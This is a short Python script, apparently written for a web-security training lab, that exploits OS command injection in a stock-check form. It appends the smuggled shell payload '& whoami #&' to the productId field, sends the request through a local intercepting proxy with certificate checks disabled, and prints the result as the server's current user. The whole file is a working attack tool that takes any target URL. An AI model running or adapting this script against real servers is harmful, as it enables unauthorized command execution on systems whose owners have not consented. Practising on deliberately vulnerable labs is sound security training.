import urllib.parse
import requests
import sys
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def command_injection(url):
    payload = "& whoami #&"
    myData = {
        'productId':'1'+payload,
        'storeId':'1'
    }
    r = requests.post(url, data=myData, verify=False, proxies=proxies)
    return r.text


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: python3 %s <url>" % sys.argv[0])
        print("(+) Example: python3 %s www.example.com" % sys.argv[0])
        return

    url = sys.argv[1]
    print("Injecting OS command...")
    username = command_injection(url)
    if username:
        print("(+) OS command injection was successful")
        print(f"(+) Name of the current user: {username}")
    else:
        print("(-) OS command injection failed")

if __name__ == "__main__":
    main()